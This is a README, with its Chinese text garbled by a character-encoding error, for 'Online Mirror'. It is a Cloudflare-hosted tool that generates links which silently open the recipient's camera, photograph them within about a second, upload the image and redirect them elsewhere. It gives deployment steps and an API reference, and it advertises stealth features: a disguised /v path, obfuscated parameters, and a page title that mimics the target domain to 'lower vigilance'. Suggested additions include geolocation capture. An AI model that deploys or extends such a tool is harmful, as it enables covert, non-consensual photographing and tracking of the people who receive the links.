# ğŸª Online Mirror - åœ¨çº¿é•œå­

<p align="center">
  <img src="logo.ico" alt="Logo" width="64" height="64">
</p>

ä¸€ä¸ªåŸºäº Cloudflare æŠ€æœ¯æ ˆçš„åœ¨çº¿æ‹ç…§åº”ç”¨ï¼Œå®Œå…¨å…è´¹ã€æ— éœ€æœåŠ¡å™¨ã€å…¨çƒåŠ é€Ÿã€‚

## âš ï¸ å…è´£å£°æ˜

**æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ï¼ä½¿ç”¨è€…éœ€éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œåæœè‡ªè´Ÿ
ï¼**

## âœ¨ ç‰¹æ€§

- ğŸ¥ **è‡ªåŠ¨æ‹ç…§** - æ‰“å¼€é“¾æ¥è‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´æ‹ç…§
- â˜ï¸ **äº‘ç«¯å­˜å‚¨** - ä½¿ç”¨ Cloudflare R2 å¯¹è±¡å­˜å‚¨
- ğŸš€ **æ— éœ€æœåŠ¡å™¨** - åŸºäº Serverless æ¶æ„
- ğŸŒ **å…¨çƒåŠ é€Ÿ** - è‡ªå¸¦ CDN åŠ é€Ÿ
- ğŸ’° **å®Œå…¨å…è´¹** - Cloudflare å…è´¹é¢åº¦è¶³å¤Ÿä½¿ç”¨
- ğŸ”’ **HTTPS æ”¯æŒ** - è‡ªåŠ¨å¯ç”¨å®‰å…¨è¿æ¥

## ğŸ“¦ æŠ€æœ¯æ ˆ

| ç»„ä»¶ | æŠ€æœ¯               | è¯´æ˜                    |
| ---- | ------------------ | ----------------------- |
| å‰ç«¯ | HTML + JavaScript  | çº¯é™æ€é¡µé¢ï¼Œæ— éœ€ç¼–è¯‘    |
| åç«¯ | Cloudflare Workers | Serverless å‡½æ•°å¤„ç† API |
| å­˜å‚¨ | Cloudflare R2      | å¯¹è±¡å­˜å‚¨ï¼Œå­˜å‚¨ç…§ç‰‡      |
| æ‰˜ç®¡ | Cloudflare Pages   | é™æ€ç½‘ç«™æ‰˜ç®¡            |

**æŠ€æœ¯æ ˆå æ¯”ï¼š**

![æŠ€æœ¯æ ˆå æ¯”](https://mdn.alipayobjects.com/one_clip/afts/img/FTqQQ5NqrKwAAAAASDAAAAgAoEACAQFr/original)

### ğŸ“Š ç³»ç»Ÿæ¶æ„å›¾

å±•ç¤ºé¡¹ç›®çš„ä¸‰å±‚æ¶æ„ï¼šå‰ç«¯å±‚ï¼ˆPagesï¼‰ã€åç«¯å±‚ï¼ˆWorkersï¼‰ã€å­˜å‚¨å±‚ï¼ˆR2ï¼‰

![ç³»ç»Ÿæ¶æ„](https://mdn.alipayobjects.com/one_clip/afts/img/XRpVRJdC12AAAAAASeAAAAgAoEACAQFr/original)

### ğŸ”„ ä¸šåŠ¡æµç¨‹å›¾

å±•ç¤ºä»ç”Ÿæˆé“¾æ¥åˆ°æ‹ç…§ä¸Šä¼ çš„å®Œæ•´æµç¨‹ï¼Œé‡ç‚¹æ ‡æ³¨ 10ms æé€Ÿæ‹ç…§å’Œå…ˆè·³è½¬åä¸Šä¼ çš„ä¼˜åŒ–ç­–
ç•¥

![ä¸šåŠ¡æµç¨‹](https://mdn.alipayobjects.com/one_clip/afts/img/fTLGQqJ7KP8AAAAARWAAAAgAoEACAQFr/original)

### ğŸŒ ç½‘ç»œæ¶æ„å›¾

å±•ç¤º Cloudflare CDNã€DNS é¢„è§£æç­‰ç½‘ç»œä¼˜åŒ–å±‚é¢çš„æ¶æ„

![ç½‘ç»œæ¶æ„](https://mdn.alipayobjects.com/one_clip/afts/img/xeh7Tbo3wWcAAAAASQAAAAgAoEACAQFr/original)


## ğŸ“ é¡¹ç›®ç»“æ„

```
Online-Mirror/
â”œâ”€â”€ index.html              # å…¥å£é¡µï¼ˆé‡å®šå‘åˆ° home.htmlï¼‰
â”œâ”€â”€ home.html               # ä¸»é¡µï¼ˆç”Ÿæˆæ‹ç…§é“¾æ¥ï¼‰
â”œâ”€â”€ v.html                  # æ‹ç…§é¡µé¢ï¼ˆæ–°ï¼‰- ä¼ªè£…è·¯å¾„ /v
â”œâ”€â”€ camera.html             # æ‹ç…§é¡µé¢ï¼ˆæ—§ï¼‰- å…¼å®¹æ—§é“¾æ¥
â”œâ”€â”€ view.html               # ç…§ç‰‡æŸ¥çœ‹é¡µé¢
â”œâ”€â”€ test.html               # ç½‘ç»œè¯Šæ–­é¡µé¢
â”œâ”€â”€ worker.js               # Cloudflare Worker API åç«¯
â”œâ”€â”€ config.js               # API é…ç½®ï¼ˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œä¸æäº¤åˆ° GitHubï¼‰
â”œâ”€â”€ config.example.js       # API é…ç½®ç¤ºä¾‹
â”œâ”€â”€ logo.ico                # ç½‘ç«™å›¾æ ‡
â”œâ”€â”€ package.json            # é¡¹ç›®ä¾èµ–
â”œâ”€â”€ wrangler.toml           # Cloudflare Workers é…ç½®
â”œâ”€â”€ _redirects              # Cloudflare Pages é‡å®šå‘è§„åˆ™
â”œâ”€â”€ _headers                # Cloudflare Pages HTTP å¤´éƒ¨é…ç½®
â”œâ”€â”€ .gitignore              # Git å¿½ç•¥æ–‡ä»¶
â”œâ”€â”€ scripts/                # éƒ¨ç½²è„šæœ¬ç›®å½•
â”‚   â”œâ”€â”€ deploy.bat          # Windows ä¸€é”®éƒ¨ç½²
â”‚   â”œâ”€â”€ deploy.sh           # Linux/Mac ä¸€é”®éƒ¨ç½²
â”‚   â”œâ”€â”€ deploy-main.bat     # Windows ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²
â”‚   â”œâ”€â”€ deploy-main.sh      # Linux/Mac ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²
â”‚   â””â”€â”€ test-dns.bat        # DNS è¯Šæ–­è„šæœ¬
â””â”€â”€ README.md               # æœ¬æ–‡ä»¶
```

## ğŸš€ å¿«é€Ÿéƒ¨ç½²

### å‰ç½®è¦æ±‚

1. **Cloudflare è´¦å·**ï¼ˆå…è´¹ï¼‰- [æ³¨å†Œåœ°å€](https://dash.cloudflare.com/sign-up)
2. **Node.js ç¯å¢ƒ** - [ä¸‹è½½åœ°å€](https://nodejs.org/)

### æ–¹å¼ 1ï¼šä¸€é”®éƒ¨ç½²ï¼ˆæ¨èï¼‰

**Windows ç”¨æˆ·ï¼š**

```bash
# åŒå‡»è¿è¡Œ
scripts/deploy.bat
```

**Linux/Mac ç”¨æˆ·ï¼š**

```bash
# ç»™äºˆæ‰§è¡Œæƒé™
chmod +x scripts/deploy.sh

# è¿è¡Œè„šæœ¬
./scripts/deploy.sh
```

### æ–¹å¼ 2ï¼šæ‰‹åŠ¨éƒ¨ç½²

#### ç¬¬ 1 æ­¥ï¼šå®‰è£… Wrangler CLI

```bash
npm install -g wrangler
```

#### ç¬¬ 2 æ­¥ï¼šç™»å½• Cloudflare

```bash
wrangler login
```

è¿™ä¼šæ‰“å¼€æµè§ˆå™¨ï¼Œæˆæƒ Wrangler è®¿é—®ä½ çš„ Cloudflare è´¦å·ã€‚

#### ç¬¬ 3 æ­¥ï¼šåˆ›å»º R2 å­˜å‚¨æ¡¶

```bash
wrangler r2 bucket create photos
```

#### ç¬¬ 4 æ­¥ï¼šéƒ¨ç½² Worker

```bash
wrangler deploy
```

éƒ¨ç½²æˆåŠŸåï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ª URLï¼Œç±»ä¼¼ï¼š

```
https://online-mirror.your-subdomain.workers.dev
```

#### ç¬¬ 5 æ­¥ï¼šé…ç½® API åœ°å€

**é‡è¦ï¼** å¤åˆ¶ `config.example.js` ä¸º `config.js` å¹¶ä¿®æ”¹é…ç½®ï¼š

```bash
# Windows
copy config.example.js config.js

# Linux/Mac
cp config.example.js config.js
```

ç¼–è¾‘ `config.js`ï¼Œå°† Worker URL æ›¿æ¢ä¸ºç¬¬ 4 æ­¥å¾—åˆ°çš„ URLï¼š

```javascript
const API_BASE_URL = "https://online-mirror.your-subdomain.workers.dev";
```

#### ç¬¬ 6 æ­¥ï¼šéƒ¨ç½²å‰ç«¯åˆ° Cloudflare Pages

**æ–¹å¼ Aï¼šé€šè¿‡ Git éƒ¨ç½²ï¼ˆæ¨èï¼‰**

1. å°†ä»£ç æ¨é€åˆ° GitHubï¼ˆè§ä¸‹æ–¹"å‘å¸ƒåˆ° GitHub"éƒ¨åˆ†ï¼‰
2. è®¿é—®ï¼šhttps://dash.cloudflare.com/pages
3. ç‚¹å‡» "Create a project"
4. è¿æ¥ä½ çš„ GitHub ä»“åº“
5. æ„å»ºè®¾ç½®ï¼š
   - **æ„å»ºå‘½ä»¤**ï¼šç•™ç©º
   - **è¾“å‡ºç›®å½•**ï¼š`/`
6. éƒ¨ç½²

**æ–¹å¼ Bï¼šç›´æ¥ä¸Šä¼ **

```bash
# éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒï¼ˆmain åˆ†æ”¯ - è‡ªå®šä¹‰åŸŸåï¼‰
npx wrangler pages deploy . --project-name=online-mirror --branch=main
```

## ğŸ® ä½¿ç”¨æ–¹æ³•

1. **è®¿é—®ä¸»é¡µ** - æ‰“å¼€éƒ¨ç½²åçš„ç½‘ç«™
2. **è¾“å…¥ ID** - è‡ªå®šä¹‰ä¸€ä¸ª IDï¼ˆä½œä¸ºæŸ¥çœ‹ç…§ç‰‡çš„å‡­è¯ï¼‰
3. **è®¾ç½®è·³è½¬åœ°å€** - æ‹ç…§åè·³è½¬çš„ç½‘ç«™ï¼ˆå¦‚ï¼šhttps://baidu.comï¼‰
4. **ç”Ÿæˆé“¾æ¥** - ç‚¹å‡»"ç”Ÿæˆé“¾æ¥"æŒ‰é’®
5. **å‘é€é“¾æ¥** - å°†ç”Ÿæˆçš„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·
6. **æŸ¥çœ‹ç…§ç‰‡** - è¾“å…¥ ID åç‚¹å‡»"æŸ¥çœ‹ç…§ç‰‡"

### âš¡ å·¥ä½œåŸç†

```
ç”¨æˆ·æ‰“å¼€é“¾æ¥ â†’ è‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ â†’ 1ç§’åæ‹ç…§ â†’ ä¸Šä¼ åˆ°äº‘ç«¯ â†’ è·³è½¬åˆ°æŒ‡å®šç½‘ç«™
```

## ğŸŒ API æ¥å£æ–‡æ¡£

### 1. ä¸Šä¼ ç…§ç‰‡

**è¯·æ±‚**

```http
POST /api/upload
Content-Type: application/json

{
  "id": "ç”¨æˆ·ID",
  "image": "data:image/png;base64,..."
}
```

**å“åº”**

```json
{
  "success": true,
  "fileName": "ç”¨æˆ·ID/æ—¶é—´æˆ³.png"
}
```

### 2. è·å–ç…§ç‰‡åˆ—è¡¨

**è¯·æ±‚**

```http
GET /api/photos?id=ç”¨æˆ·ID&page=0&limit=2
```

**å“åº”**

```json
{
  "photos": [
    {
      "url": "data:image/png;base64,...",
      "time": "2024-01-15 12:30:45",
      "key": "ç”¨æˆ·ID/æ—¶é—´æˆ³.png"
    }
  ],
  "total": 10,
  "currentPage": 0,
  "totalPages": 5
}
```

### 3. åˆ é™¤æ‰€æœ‰ç…§ç‰‡

**è¯·æ±‚**

```http
DELETE /api/photos?id=ç”¨æˆ·ID
```

**å“åº”**

```json
{
  "success": true,
  "deleted": 10
}
```

## ğŸ› ï¸ æœ¬åœ°å¼€å‘

### å¯åŠ¨å¼€å‘æœåŠ¡å™¨

```bash
# å®‰è£…ä¾èµ–
npm install

# å¯åŠ¨å¼€å‘æœåŠ¡å™¨
npm run dev
```

è¿™ä¼šå¯åŠ¨ï¼š

- Workerï¼šhttp://localhost:8787
- å‰ç«¯ï¼šç›´æ¥æ‰“å¼€ `home.html` æˆ–ä½¿ç”¨ä»»ä½•é™æ€æœåŠ¡å™¨

### æµ‹è¯• API

```bash
# æµ‹è¯•ä¸Šä¼ 
curl -X POST http://localhost:8787/api/upload \
  -H "Content-Type: application/json" \
  -d '{"id":"test123","image":"data:image/png;base64,iVBORw0..."}'

# æµ‹è¯•è·å–ç…§ç‰‡
curl http://localhost:8787/api/photos?id=test123&page=0&limit=2

# æµ‹è¯•åˆ é™¤
curl -X DELETE http://localhost:8787/api/photos?id=test123
```

## ğŸ’° æˆæœ¬è¯´æ˜

### Cloudflare å…è´¹é¢åº¦

| æœåŠ¡    | å…è´¹é¢åº¦        | è¶…å‡ºè´¹ç”¨       |
| ------- | --------------- | -------------- |
| Workers | 100,000 è¯·æ±‚/å¤© | $0.50/ç™¾ä¸‡è¯·æ±‚ |
| R2 å­˜å‚¨ | 10GB å­˜å‚¨       | $0.015/GB/æœˆ   |
| R2 å†™å…¥ | 100 ä¸‡æ¬¡/æœˆ     | $4.50/ç™¾ä¸‡æ¬¡   |
| R2 è¯»å– | 1000 ä¸‡æ¬¡/æœˆ    | $0.36/ç™¾ä¸‡æ¬¡   |
| Pages   | æ— é™è¯·æ±‚        | å®Œå…¨å…è´¹       |

**æœ¬é¡¹ç›®åœ¨å…è´¹é¢åº¦å†…å®Œå…¨å¤Ÿç”¨ï¼**

## ğŸ”’ å®‰å…¨å»ºè®®

### 1. æ·»åŠ è®¿é—®æ§åˆ¶

åœ¨ `worker.js` ä¸­æ·»åŠ ï¼š

```javascript
async function authenticate(request) {
  const auth = request.headers.get("Authorization");
  const validAuth = "Basic " + btoa("admin:your-password");
  return auth === validAuth;
}

// åœ¨APIå¤„ç†å‰æ£€æŸ¥
if (!(await authenticate(request))) {
  return new Response("Unauthorized", { status: 401 });
}
```

### 2. é™åˆ¶ä¸Šä¼ å¤§å°

```javascript
const maxSize = 5 * 1024 * 1024; // 5MB
if (buffer.byteLength > maxSize) {
  return new Response("æ–‡ä»¶è¿‡å¤§", { status: 413 });
}
```

### 3. å®šæœŸæ¸…ç†æ—§ç…§ç‰‡

åœ¨ `worker.js` ä¸­æ·»åŠ å®šæ—¶ä»»åŠ¡ï¼š

```javascript
export default {
  async scheduled(event, env, ctx) {
    // æ¯å¤©æ‰§è¡Œä¸€æ¬¡ï¼Œåˆ é™¤7å¤©å‰çš„ç…§ç‰‡
    const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;

    const listed = await env.PHOTO_BUCKET.list();
    for (const obj of listed.objects) {
      if (obj.uploaded.getTime() < sevenDaysAgo) {
        await env.PHOTO_BUCKET.delete(obj.key);
      }
    }
  },
};
```

åœ¨ `wrangler.toml` ä¸­æ·»åŠ ï¼š

```toml
[triggers]
crons = ["0 0 * * *"]  # æ¯å¤©UTCæ—¶é—´0ç‚¹æ‰§è¡Œ
```

## ğŸ“Š ç›‘æ§ä¸ç®¡ç†

### æŸ¥çœ‹ R2 å­˜å‚¨ä½¿ç”¨æƒ…å†µ

```bash
wrangler r2 bucket list
```

### æŸ¥çœ‹ Worker æ—¥å¿—

```bash
wrangler tail
```

### åˆ é™¤å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶

```bash
# åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶
wrangler r2 object list photos

# åˆ é™¤ç‰¹å®šIDçš„æ–‡ä»¶
wrangler r2 object delete photos/test123/20240101120000.png
```

## ğŸ“¤ å‘å¸ƒåˆ° GitHub

### ğŸ”’ å®‰å…¨å‡†å¤‡

æœ¬é¡¹ç›®å·²é…ç½® `.gitignore` è‡ªåŠ¨æ’é™¤æ•æ„Ÿä¿¡æ¯ï¼Œ**å¯ä»¥å®‰å…¨å‘å¸ƒåˆ° GitHub**ã€‚

**å·²æ’é™¤çš„æ•æ„Ÿæ–‡ä»¶ï¼š**

- âœ… `config.js` - åŒ…å«æ‚¨çš„ Worker URL å’Œè´¦å· ID
- âœ… `.wrangler/` - æœ¬åœ°å¼€å‘é…ç½®
- âœ… `node_modules/` - ä¾èµ–åŒ…

### ğŸ“‹ å‘å¸ƒæ­¥éª¤

#### 1. åˆå§‹åŒ– Git ä»“åº“

```bash
# å¦‚æœè¿˜æ²¡æœ‰ Git ä»“åº“
git init

# æ·»åŠ æ–‡ä»¶ï¼ˆä¼šè‡ªåŠ¨æ’é™¤ .gitignore ä¸­çš„æ–‡ä»¶ï¼‰
git add .

# æäº¤
git commit -m "Initial commit: Online Mirror é¡¹ç›®"
```

#### 2. åˆ›å»º GitHub ä»“åº“

1. è®¿é—® https://github.com/new
2. åˆ›å»ºæ–°ä»“åº“ï¼ˆå»ºè®®è®¾ä¸º **Private** æˆ– **Public**ï¼‰
3. ä¸è¦åˆå§‹åŒ– READMEã€.gitignore æˆ– LICENSE

#### 3. æ¨é€åˆ° GitHub

```bash
# æ·»åŠ è¿œç¨‹ä»“åº“
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git

# æ¨é€ä»£ç 
git branch -M main
git push -u origin main
```

### âš ï¸ é‡è¦å®‰å…¨æç¤º

1. **é¦–æ¬¡éƒ¨ç½²å¿…é¡»é…ç½® `config.js`**

   ```bash
   cp config.example.js config.js
   # ç„¶åç¼–è¾‘ config.js å¡«å…¥æ‚¨çš„ Worker URL
   ```

2. **æ£€æŸ¥ Git çŠ¶æ€**

   ```bash
   # ç¡®è®¤ config.js ä¸åœ¨å¾…æäº¤åˆ—è¡¨ä¸­
   git status
   ```

   å¦‚æœçœ‹åˆ° `config.js`ï¼Œè¯´æ˜ `.gitignore` æœªç”Ÿæ•ˆï¼Œæ‰§è¡Œï¼š

   ```bash
   git rm --cached config.js
   ```

3. **å…‹éš†åçš„é…ç½®**

   å…¶ä»–äººå…‹éš†æ‚¨çš„ä»“åº“åï¼Œéœ€è¦ï¼š

   ```bash
   # 1. å¤åˆ¶é…ç½®æ–‡ä»¶
   cp config.example.js config.js

   # 2. ç¼–è¾‘é…ç½®ï¼Œå¡«å…¥ä»–ä»¬è‡ªå·±çš„ Worker URL
   # 3. éƒ¨ç½²ä»–ä»¬è‡ªå·±çš„ Worker å’Œ Pages
   ```

### ğŸŒŸ å…¬å¼€è¿˜æ˜¯ç§æœ‰ï¼Ÿ

**å»ºè®®ï¼šè®¾ä¸º Publicï¼ˆå…¬å¼€ï¼‰**

- âœ… ä»£ç ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯
- âœ… å¸®åŠ©å…¶ä»–äººå­¦ä¹ å’Œä½¿ç”¨
- âœ… å¯ä»¥è·å¾—ç¤¾åŒºåé¦ˆå’Œè´¡çŒ®

**æ³¨æ„ï¼š**

- âš ï¸ ç¡®ä¿ `config.js` å·²åœ¨ `.gitignore` ä¸­
- âš ï¸ ä¸è¦æäº¤åŒ…å«ä¸ªäººåŸŸåã€ID çš„æˆªå›¾æˆ–æ–‡æ¡£

## âš¡ æ€§èƒ½ä¼˜åŒ–

é¡¹ç›®å·²å†…ç½®å¤šé¡¹æ€§èƒ½ä¼˜åŒ–ï¼š

### ğŸš€ é€Ÿåº¦ä¼˜åŒ–

- **DNS é¢„è§£æ** - æ‰€æœ‰é¡µé¢æ·»åŠ  `dns-prefetch` å’Œ `preconnect`
- **10ms æé€Ÿæ‹ç…§** - ä¼˜åŒ–æ‹ç…§å»¶è¿Ÿä» 100ms åˆ° 10ms
- **JPEG å‹ç¼©** - ä½¿ç”¨ JPEG 0.7 è´¨é‡ï¼Œæ–‡ä»¶å‡å° 60%+
- **å…ˆè·³è½¬åä¸Šä¼ ** - å®Œå…¨éé˜»å¡ï¼Œ0 ç­‰å¾…æ—¶é—´
- **HTTP ç¼“å­˜** - åˆç†çš„ç¼“å­˜ç­–ç•¥å‡å°‘é‡å¤åŠ è½½

### ğŸ” å®‰å…¨ & éšè”½æ€§

- **Base64 å‚æ•°åŠ å¯†** - URL å‚æ•°åŠ å¯†å¤„ç†ï¼Œç¼©çŸ­ 36%
- **ä¼ªè£…æ–‡ä»¶å** - ä½¿ç”¨ `/v` è€Œé `/camera`
- **åŠ¨æ€é¡µé¢æ ‡é¢˜** - æ˜¾ç¤ºç›®æ ‡åŸŸåé™ä½è­¦è§‰æ€§
- **å®‰å…¨å¤´éƒ¨** - XSS ä¿æŠ¤ã€é˜²ç‚¹å‡»åŠ«æŒã€CSP ç­‰

### ğŸ“Š ç½‘ç»œè¯Šæ–­

è®¿é—® `/test.html` å¯ä»¥è¯Šæ–­ç½‘ç»œé—®é¢˜ï¼š

- âœ… æµè§ˆå™¨æ”¯æŒæ£€æµ‹
- âœ… API è¿æ¥æµ‹è¯•
- âœ… HTTPS å®‰å…¨æ£€æŸ¥
- âœ… ç½‘ç»œå»¶è¿Ÿæµ‹è¯•
- âœ… DNS è§£ææ£€æµ‹

## â“ å¸¸è§é—®é¢˜

### Q1ï¼šä¸ºä»€ä¹ˆæ‹æ‘„çš„æ˜¯é»‘å±ï¼Ÿ

**A**ï¼šå› ä¸ºè¯¥æµè§ˆå™¨ä¸æ”¯æŒ WebRTCï¼Œæ›´æ¢æµè§ˆå™¨å³å¯ã€‚å®‰å“ç”¨æˆ·å»ºè®®ç›´æ¥åœ¨ QQ å†…æ‰“å¼€é“¾
æ¥ã€‚

### Q2ï¼šæ‹æ‘„çš„ç…§ç‰‡ä¸å…¨ï¼Ÿ

**A**ï¼šè¿˜æ²¡ç­‰è·³è½¬å®Œæˆå°±å…³é—­äº†é¡µé¢ï¼Œæ•°æ®è¿˜æ²¡ä¼ è¾“å®Œæˆã€‚è¯·ç­‰å¾…è‡ªåŠ¨è·³è½¬ã€‚

### Q3ï¼šWorker éƒ¨ç½²å¤±è´¥ï¼Ÿ

**A**ï¼šæ£€æŸ¥æ˜¯å¦ç™»å½• Cloudflare è´¦å·ï¼Œè¿è¡Œ `wrangler whoami`

### Q4ï¼šR2 å­˜å‚¨æ¡¶åˆ›å»ºå¤±è´¥ï¼Ÿ

**A**ï¼šç¡®ä¿è´¦å·å·²å¯ç”¨ R2ï¼Œå¯èƒ½éœ€è¦ç»‘å®šæ”¯ä»˜æ–¹å¼ï¼ˆä¸ä¼šæ‰£è´¹ï¼‰

### Q5ï¼šå‰ç«¯è®¿é—® Worker æŠ¥ CORS é”™è¯¯ï¼Ÿ

**A**ï¼šæ£€æŸ¥ Worker ä¸­çš„ CORS å¤´è®¾ç½®ï¼Œç¡®ä¿åŒ…å« `Access-Control-Allow-Origin`

### Q6ï¼šå¦‚ä½•è‡ªå®šä¹‰åŸŸåï¼Ÿ

**A**ï¼šåœ¨ Cloudflare Pages è®¾ç½®ä¸­æ·»åŠ è‡ªå®šä¹‰åŸŸåï¼Œéœ€è¦åŸŸååœ¨ Cloudflare æ‰˜ç®¡

### Q7ï¼šå‡ºç° `ERR_TOO_MANY_REDIRECTS` é”™è¯¯ï¼Ÿ

**A**ï¼šè¿™æ˜¯é‡å®šå‘å¾ªç¯é—®é¢˜ï¼Œå·²åœ¨æœ€æ–°ç‰ˆæœ¬ä¿®å¤ã€‚è§£å†³æ–¹æ³•ï¼š

1. æ¸…é™¤æµè§ˆå™¨ç¼“å­˜ï¼ˆCtrl + Shift + Deleteï¼‰
2. ä½¿ç”¨éšç§/æ— ç—•æ¨¡å¼æµ‹è¯•
3. ç¡®ä¿ `_redirects` æ–‡ä»¶å†…å®¹ä¸ºï¼š`/v /v.html 200!`
4. é‡æ–°éƒ¨ç½²ï¼š`npx wrangler pages deploy . --project-name=online-mirror --branch=main`

### Q8ï¼šåˆ«äººè®¿é—®é“¾æ¥æ‰“ä¸å¼€æˆ–å¾ˆæ…¢ï¼Ÿ

**A**ï¼šå¯èƒ½åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š

1. **DNS è§£ææ…¢** - è®©å¯¹æ–¹è®¿é—®è¯Šæ–­é¡µé¢ `/test.html` æ£€æµ‹
2. **æµè§ˆå™¨ç¼“å­˜** - è®©å¯¹æ–¹æ¸…é™¤ç¼“å­˜æˆ–ä½¿ç”¨éšç§æ¨¡å¼
3. **ç½‘ç»œé—®é¢˜** - æä¾›å¤‡ç”¨åŸŸåï¼š`https://online-mirror.pages.dev`
4. **è‡ªå®šä¹‰åŸŸåé—®é¢˜** - æ”¹ç”¨ Cloudflare Pages é»˜è®¤åŸŸå

## ğŸ“ˆ æ‰©å±•åŠŸèƒ½å»ºè®®

- ğŸ“ æ·»åŠ åœ°ç†ä½ç½®ä¿¡æ¯
- ğŸ”” æ–°ç…§ç‰‡æ¨é€é€šçŸ¥ï¼ˆTelegram Bot / Emailï¼‰
- ğŸ“¦ æ‰¹é‡ä¸‹è½½/åˆ é™¤æ“ä½œ
- ğŸ“Š è®¿é—®ç»Ÿè®¡å’Œæ•°æ®åˆ†æ
- ğŸ¨ å›¾ç‰‡æ»¤é•œå’Œç¼–è¾‘åŠŸèƒ½

## ğŸ“ å­¦ä¹ èµ„æº

- [Cloudflare Workers æ–‡æ¡£](https://developers.cloudflare.com/workers/)
- [Cloudflare R2 æ–‡æ¡£](https://developers.cloudflare.com/r2/)
- [Cloudflare Pages æ–‡æ¡£](https://developers.cloudflare.com/pages/)
- [WebRTC API æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API)

## ğŸ“ æ³¨æ„äº‹é¡¹

1. **ID æ˜¯æŸ¥çœ‹ç…§ç‰‡çš„å”¯ä¸€å‡­è¯ï¼Œè¯·å¦¥å–„ä¿ç®¡ï¼Œä¸è¦æ³„éœ²ç»™çŸ¥é“è¿™ä¸ªå¹³å°çš„äºº**
2. **ä¸ºèŠ‚çœå­˜å‚¨èµ„æºï¼Œå»ºè®®å®šæœŸæ¸…ç†æ—§ç…§ç‰‡**
3. **è¯·éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œä¸è¦ç”¨äºéæ³•ç”¨é€”**

## ğŸ“ æŠ€æœ¯æ”¯æŒ

å¦‚æœ‰é—®é¢˜ï¼Œæ¬¢è¿æ Issue æˆ– PRã€‚

- Cloudflare æ–‡æ¡£ï¼šhttps://developers.cloudflare.com/
- Wrangler æ–‡æ¡£ï¼šhttps://developers.cloudflare.com/workers/wrangler/
- R2 æ–‡æ¡£ï¼šhttps://developers.cloudflare.com/r2/

---

## ğŸ‰ éƒ¨ç½²å®Œæˆ

è®¿é—®åœ°å€ï¼š

- **ä¸»é¡µ**ï¼šhttps://your-project.pages.dev
- **API**ï¼šhttps://online-mirror.your-subdomain.workers.dev/api/*

**äº«å—å®Œå…¨å…è´¹çš„äº‘æœåŠ¡å§ï¼** ğŸš€

---

<p align="center">Made with â¤ï¸ using Cloudflare</p>
